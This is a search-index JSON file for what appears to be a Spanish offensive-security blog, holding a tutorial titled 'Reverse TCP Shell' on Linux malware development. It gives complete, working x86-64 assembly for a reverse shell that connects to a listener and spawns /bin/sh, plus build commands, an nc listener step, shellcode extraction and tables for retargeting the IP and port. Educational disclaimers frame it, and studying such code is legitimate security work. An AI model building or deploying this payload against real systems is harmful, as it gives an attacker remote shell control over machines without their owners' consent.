{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"RAZOR","text":"Offensive Security Research <p>       Notas t\u00e9cnicas sobre seguridad ofensiva y desarrollo de malware en Linux.     </p> <p>       \u26a0\ufe0f Todo el contenido es exclusivamente con fines educativos y de investigaci\u00f3n.     </p> Malware Dev"},{"location":"#secciones","title":"Secciones","text":"Malware Development Shellcode, process injection, t\u00e9cnicas ofensivas Low-level"},{"location":"#ultimos-posts","title":"\u00daltimos posts","text":"Reverse TCP Shell Reverse shell TCP en ensamblador x86-64 usando \u00fanicamente syscalls Assembly 5 min"},{"location":"research/malware-dev/","title":"Malware Development","text":"<p>Disclaimer</p> <p>Este contenido es exclusivamente para fines educativos y de investigaci\u00f3n en entornos autorizados.</p>"},{"location":"research/malware-dev/#articulos","title":"Art\u00edculos","text":"Assembly Reverse TCP Shell Reverse shell TCP en ensamblador x86-64 usando \u00fanicamente syscalls"},{"location":"research/malware-dev/reverse-shell/","title":"Reverse TCP Shell","text":"<p>Reverse shell TCP implementado en ensamblador x86-64. Usando \u00fanicamente syscalls, sin dependencias.</p>"},{"location":"research/malware-dev/reverse-shell/#introduccion","title":"Introducci\u00f3n","text":"<p>En la reverse shell es la m\u00e1quina objetivo quien inicia la conexi\u00f3n hacia el atacante, en lugar de que el atacante se conecte a la m\u00e1quina objetivo. Esto es \u00fatil para evadir firewalls que bloquean conexiones entrantes pero permiten salientes.</p>"},{"location":"research/malware-dev/reverse-shell/#flujo-de-ejecucion","title":"Flujo de ejecuci\u00f3n","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 socket(41) \u2502\u2500\u2500s\u2500\u2500\u25b6\u2502 connect(42, s, A:P)  \u2502\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 dup2(33): 0,1,2  \u2192  s   \u2502\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 execve(59)   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n            0 = (stdin) \u2500\u2500\u2510\n            1 = (stdout)  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba socket(s) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba ATACANTE (A:P)\n            2 = (stderr) \u2500\u2518\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#crear-socket-tcp","title":"Crear socket TCP","text":"<p><code>socket</code> (n\u00ba 41 en Linux x86-64) crea un objeto de comunicaci\u00f3n en el kernel y devuelve un file descriptor (FD) para operar con \u00e9l (conectar, enlazar, escuchar, enviar/recibir). Reci\u00e9n creado es solo un objeto en memoria identificado por su FD, tiene familia/tipo/protocolo, pero no IP ni puertos. Se vuelve un endpoint real cuando se realiza una acci\u00f3n con este <code>bind()</code>, <code>connect()</code> o <code>accept()</code>.</p> <pre><code>rax = 41         ; N\u00famero de syscall (socket)\nrdi = domain     ; Familia de direcciones (AF_*)\nrsi = type       ; Tipo de socket (SOCK_*), opcionalmente OR con flags\nrdx = protocol   ; Protocolo (0 = por defecto)\n</code></pre> <p>Puesto que la idea es crear un socket TCP/IPv4 los argumentos de entrada tomar\u00e1n los siguientes valores:</p> Registro Valor Significado <code>RAX</code> 41 N\u00famero de syscall (<code>socket</code>) <code>RDI</code> 2 <code>AF_INET</code> (familia IPv4) <code>RSI</code> 1 <code>SOCK_STREAM</code> (TCP) <code>RDX</code> 0 Protocolo (0 = por defecto) <p>El registro <code>RAX</code> tras la syscall contiene el file descriptor del socket. Se vuelve un endpoint real cuando se realiza una acci\u00f3n con este <code>bind()</code>, <code>connect()</code> o <code>accept()</code>.</p>"},{"location":"research/malware-dev/reverse-shell/#conectarse-al-atacante","title":"Conectarse al atacante","text":"<p><code>connect</code> (n\u00ba 42 en Linux x86-64) solicita establecer una conexi\u00f3n entre un socket previamente creado y un endpoint remoto. En TCP/<code>SOCK_STREAM</code>, inicia el handshake TCP (SYN \u2192 SYN/ACK \u2192 ACK)</p> <pre><code>rax = 42         ; N\u00famero de syscall (connect)\nrdi = sockfd     ; FD del socket (devuelto por socket())\nrsi = addr       ; puntero a struct sockaddr (sockaddr_in / sockaddr_in6 / sockaddr_un, \u2026)\nrdx = addrlen    ; tama\u00f1o de esa struct (16 para sockaddr_in)\n</code></pre> <p>Estructura <code>sockaddr_in</code></p> <p>La estructura <code>sockaddr_in</code> define la direcci\u00f3n destino y est\u00e1 compuesta por 16 bytes. La construiremos directamente en el stack empaquetando los valores en un qword.</p> <p>El desglose interno de los campos ser\u00eda el siguiente:</p> Campo Bytes Valor Significado <code>sin_family</code> <code>02 00</code> <code>2</code> <code>AF_INET</code> <code>sin_port</code> <code>11 5c</code> <code>4444</code> Puerto en network byte order <code>sin_addr</code> <code>7f 00 00 01</code> <code>127.0.0.1</code> IP destino <code>sin_zero</code> <code>00 00 00 00 00 00 00 00</code> <code>0</code> Padding (8 bytes) <p>El padding se pushea primero en el stack (8 bytes de ceros), luego el qword con familia+puerto+IP (8 bytes), formando los 16 bytes totales.</p>"},{"location":"research/malware-dev/reverse-shell/#redirigir-io","title":"Redirigir I/O","text":"<p><code>dup2</code> (n\u00ba 33 en Linux x86-64) duplica un file descriptor (FD) existente sobre otro n\u00famero de FD espec\u00edfico, cerrando primero el FD destino si estaba abierto. Tras la llamada, ambos apuntan al mismo open file description (mismo offset y file status flags). Es fundamental para redirecciones de entrada/salida, permitiendo que <code>stdin</code>/<code>stdout</code>/<code>stderr</code> apunten a archivos, sockets o pipes. </p> <pre><code>rax = 33        ; N\u00famero de syscall (dup2)\nrdi = oldfd     ; Descriptor existente a duplicar\nrsi = newfd     ; N\u00famero de descriptor destino\n</code></pre> <p>Ejecutaremos <code>dup2</code> en tres ocasiones para redirigir <code>stdin</code>/<code>stdout</code>/<code>stderr</code> al socket:</p> Iteraci\u00f3n RSI Efecto 1 0 <code>stdin</code> \u2192 socket 2 1 <code>stdout</code> \u2192 socket 3 2 <code>stderr</code> \u2192 socket"},{"location":"research/malware-dev/reverse-shell/#ejecutar-shell","title":"Ejecutar Shell","text":"<p><code>execve</code> (n\u00ba 59 en Linux x86-64) reemplaza la imagen del proceso actual por la de un nuevo programa. Si tiene \u00e9xito, el flujo contin\u00faa en el c\u00f3digo del programa cargado.</p> <pre><code>rax = 59             ; N\u00famero de syscall (execve)\nrdi = filename       ; puntero a cadena con la ruta al ejecutable (C-string)\nrsi = argv           ; puntero a array de punteros a C-string (argv[0..n], terminado en NULL)\nrdx = envp           ; puntero a array de punteros a C-string (variables de entorno, terminado en NULL)\n</code></pre> <p>Puesto que la idea es ejecutar <code>/bin/sh</code> en el sistema objetivo:</p> Registro Valor Significado <code>RAX</code> 59 N\u00famero de syscall (<code>execve</code>) <code>RDI</code> <code>pathname</code> Puntero a <code>\"/bin/sh\\0\"</code> <code>RSI</code> <code>argv</code> Puntero a array de argumentos (NULL) <code>RDX</code> <code>envp</code> Puntero a array de entorno (NULL) <p>Construimos los argumentos en el stack, primero el null terminator, luego la cadena y despu\u00e9s los punteros NULL para argv y envp.</p> <p>La cadena <code>/bin/sh</code> equivale a <code>2F 62 69 6E 2F 73 68</code> (7 bytes). Para cargarla usaremos el valor <code>0x68732f6e69622f</code> (little-endian). Al hacer push, los bytes se almacenan en memoria en el orden correcto.</p>"},{"location":"research/malware-dev/reverse-shell/#codigo-completo-rev_shellasm","title":"C\u00f3digo completo (rev_shell.asm)","text":"<pre><code>section .text\nglobal _start\n_start:\n    ; SOCKET\n    mov rax, 41\n    mov rdi, 2 ;IPV4\n    mov rsi, 1 ;TCP\n    xor rdx, rdx ; Default\n    syscall\n    ; Store socket FD\n    mov r8, rax\n    ; CONNECT\n    mov rax, 42\n    mov rdi, r8\n                    ;   Stack        Low  &lt;----------- High\n    ; Entrada esperada: 02 00 11 5c 7F 00 00 01 00 00 00 00 00 00 00 00   \n    ;                   \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)\n    ;                   fam   port  IP          padding\n    ; Mapeado de los campos de sockaddr_in:\n                        ; Bytes 0-1:   02 00           \u2192 sin_family (AF_INET = 2)\n                        ; Bytes 2-3:   11 5c           \u2192 sin_port (4444)\n                        ; Bytes 4-7:   7f 00 00 01     \u2192 sin_addr (127.0.0.1)\n                        ; Bytes 8-15:  00 00 00 00...  \u2192 sin_zero (padding)\n    xor r9,r9 ; 0\n    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)\n    mov r10, 0x0100007f5c110002\n    push r10 ; sin_family + sin_port + sin_addr (8 bytes)\n    mov rsi, rsp ; direccion del tope de la pila\n    mov rdx, 16 ;IPV4 (espera 16 bytes)\n    syscall\n    xor rsi,rsi\n.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket\n    ;DUP2\n    mov rax, 33\n    mov rdi, r8\n    syscall \n    inc rsi\n    cmp rsi, 3\n    jl .dup2\n    ; EXEXCVE\n    mov rax, 59\n    push 0                       ; null terminator de /bin/sh -&gt; /bin/sh\\0\n    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian\n    push r12                     ; string /bin/sh\n    mov rdi, rsp\n    push 0                       ; argv = {NULL}\n    mov rsi, rsp\n    push 0                       ; envp = {NULL}\n    mov rdx, rsp\n    syscall \n.done:\n    ; EXIT\n    mov rax, 60                    ; syscall: exit\n    xor rdi, rdi                   ; exit code = 0 (\u00e9xito)\n    syscall\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#compilacion-y-uso","title":"Compilaci\u00f3n y uso","text":"<pre><code># Compilar\nnasm -f elf64 rev_shell.asm -o rev_shell.o\nld rev_shell.o -o rev_shell\n\n# En la m\u00e1quina atacante: iniciar listener\nnc -lvnp 4444\n\n# En la m\u00e1quina objetivo: ejecutar\n./rev_shell\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#extraccion-de-bytes","title":"Extracci\u00f3n de bytes","text":"<pre><code># Extraer solo la secci\u00f3n .text\nobjcopy -O binary --only-section=.text rev_shell rev_shell.bin\n\n# Visualizar los bytes (C)\nxxd -i rev_shell.bin\n\n# Ver tama\u00f1o\nwc -c rev_shell.bin\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#personalizacion","title":"Personalizaci\u00f3n","text":""},{"location":"research/malware-dev/reverse-shell/#cambiar-ip-de-destino","title":"Cambiar IP de destino","text":"<p>Cada octeto de la IP se convierte a hexadecimal. </p> IP Valor (Hex) 127.0.0.1 <code>0x7F000001</code> 192.168.1.1 <code>0xC0A80101</code> 192.168.18.245 <code>0xC0A812F5</code> 10.0.0.50 <code>0x0A000032</code>"},{"location":"research/malware-dev/reverse-shell/#cambiar-puerto","title":"Cambiar puerto","text":"<p>El puerto se almacena en network byte order (big-endian).</p> Puerto Valor (Hex) 4444 <code>0x115c</code> 8080 <code>0x1f90</code> 443 <code>0x01BB</code> 9001 <code>0x2329</code> <p>Uso responsable</p> <p>El contenido de este sitio web se publica exclusivamente con fines educativos e informativos. El autor no promueve, respalda ni se hace responsable del uso indebido o ilegal de la informaci\u00f3n aqu\u00ed expuesta. Cualquier acci\u00f3n realizada a partir de este contenido debe llevarse a cabo \u00fanicamente en entornos controlados, sistemas propios o con autorizaci\u00f3n expresa y verificable del propietario del sistema.</p>"}]}